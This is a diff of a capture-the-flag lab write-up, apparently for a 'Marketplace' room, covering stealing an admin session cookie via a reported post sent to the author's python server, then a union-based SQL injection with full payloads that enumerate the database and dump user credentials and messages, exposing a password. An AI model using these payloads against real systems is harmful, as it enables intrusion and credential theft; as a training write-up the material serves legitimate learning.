@@ -141,13 +141,13 @@ The plan is as follows:
 
     ![report-to-admin](report-to-admin.jpg){: width="50%"}
 
-4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should already have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
+4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
 
     ![admin-cookie](admin-cookie.png)
 
-    > Don't get confused because the port is shwoing as `8888` instead of `12345`. I just had to restart and ended up to use another port!
+    > Don't get confused because the port is showing as `8888` instead of `12345`. I just had to restart and ended up using another port!
 
-5. All we have to do now, is swapping our cookie with admin's cookie to access. We can do that by the brower's console:
+5. All we have to do now, is swapping our cookie with admin's cookie. We can do that via the brower's console:
 
     ```javascript
     // we need to allow pasting, so we can paste our cookie
@@ -164,93 +164,93 @@ The plan is as follows:
 
 ### 3.2 IDOR & SQLi
 
-When clicking on the different users, the address bar change as follows: `/admin?user=`. So, we have the parameter `?user` to play with, which we can check if it is susceptible to an *IDOR vulnerability*.
+When clicking on the different users, the address bar changes as follows: `/admin?user=`. So, we have the parameter `?user` to play with, which we can check if it is susceptible to an **IDOR vulnerability**.
 
-The first thing we can do is trying to break the query. Usually, putting an `'` at the end does the trick:
+The first thing we can do is trying to **break the query**. Usually, putting an `'` at the end does the trick:
 
 ![break-query](query-break.png)
 
-The fact that we are getting this error message confirms that existence of an *SQLi vulnerability*, but it is also kind enough to provide us with some extra information and let us know that the server uses *MySQL server*.
+The fact that we are getting this error message confirms that existence of an **SQLi vulnerability**, but it is also kind enough to provide us with some extra information and let us know that the server uses *MySQL server*.
 
-We can now try a *Union-Based SQLi* by using the `UNION` clause to extract the information needed. 
+We can now try a **Union-Based SQLi** by using the `UNION` clause to extract the information needed. 
 
 1. First, our goal is to get rid of the error message.
 
-```sql
-admin?user=1 UNION SELECT 1;--
-```
+    ```sql
+    admin?user=1 UNION SELECT 1;--
+    ```
 
-![sqli-1](sqli-1.png)
+    ![sqli-1](sqli-1.png)
 
-The error message informs us that our `SELECT` statement have a different number of columns. After trying `1,2` and `1,2,3`, we get something that works:
+    The error message informs us that our `SELECT` statement have a different number of columns. After trying `1,2` and `1,2,3`, we get something that works:
 
-```sql
-admin?user=1 UNION SELECT 1,2,3,4;--
-```
+    ```sql
+    admin?user=1 UNION SELECT 1,2,3,4;--
+    ```
 
-![sqli-2](sqli-2.png)
+    ![sqli-2](sqli-2.png)
 
 2. Let's try now to enumerate the databases of this site:
 
-```sql
-admin?user=1 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
-```
+    ```sql
+    admin?user=1 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
+    ```
 
-![sqli-3](sqli-3.png)
+    ![sqli-3](sqli-3.png)
 
-The result is displaying the first part of our query: `user=1`, but not the information after the `UNION` clause. That is because it takes the first returned result somewhere in the web site's code and shows just that.
+    The result is displaying the first part of our query: `user=1`, but not the information after the `UNION` clause. That is because it takes the first returned result somewhere in the web site's code and shows just that.
 
-To bypass this issue, we need the first query to produce no results. Since we know that the first user's ID is `1`, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have no results to show us back, so it will continue with the rest of our query.
+    To bypass this issue, **we need the first query to produce no results**. Since we know that the first user's ID is `1`, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have no results to show us back, so it will continue with the rest of our query.
 
-```sql
-admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
+    ```
 
-![sqli-4](sqli-4.png)
+    ![sqli-4](sqli-4.png)
 
 3. So we have found that there is a database called `marketplace`. Let's find out what tables it contains:
 
-```sql
-admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables where table_schema='marketplace'--
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables where table_schema='marketplace'--
+    ```
 
-![sqli-5](sqli-5.png)
+    ![sqli-5](sqli-5.png)
 
 4. There are 3 tables: `items`, `messages`, and `users`. The latter seems the most useful, as it could contain sensitive data, such as passwords, so let's find out its columns:
 
-```sql
-admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name='users'--
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name='users'--
+    ```
 
-![sqli-6](sqli-6.png)
+    ![sqli-6](sqli-6.png)
 
-Bingo 🎉 ! We can see that the `users` table contains a `password` field, among others.
+    Bingo 🎉 ! We can see that the `users` table contains a `password` field, among others.
 
-5. Now we know the column names. we can see all the data of the `users` table:
+5. Now we know the column names, we can see all the data of the `users` table:
 
-```sql
-admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', isAdministrator, '\n'),2,3,4 FROM marketplace.users; --
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', isAdministrator, '\n'),2,3,4 FROM marketplace.users; --
+    ```
 
-![sqli-7](sqli-7.png)
+    ![sqli-7](sqli-7.png)
 
-6. We see that the passwords are encrypted?. Let's also check the `messages` table we found earlier, starting with its columns:
+6. We see that the passwords are not stored in plaintext format, as it is usual the case. Let's also check the `messages` table we found earlier, starting with its columns:
 
-```sql
-admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages';--
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages';--
+    ```
 
-![sqli-8](sqli-8.png)
+    ![sqli-8](sqli-8.png)
 
 7. Now, let's see its full data:
 
-```sql
-admin?user=0 UNION SELECT group_concat(id, ':', message_content, ':', user_from, ':', user_to, ':', is_read, '\n'),2,3,4 FROM marketplace.messages;--
-```
+    ```sql
+    admin?user=0 UNION SELECT group_concat(id, ':', message_content, ':', user_from, ':', user_to, ':', is_read, '\n'),2,3,4 FROM marketplace.messages;--
+    ```
 
-![sqli-9](sqli-9.png)
+    ![sqli-9](sqli-9.png)
 
-There is a message revealing a new password 🔒. We know that this password belongs to user `jake`, as the fourth value is the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
+There is a message revealing a new password 🔒! We know that this password belongs to user `jake`, as the fourth value corresponds to the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
 
 ### 3.3 Sudo & Wildcard Injection
 
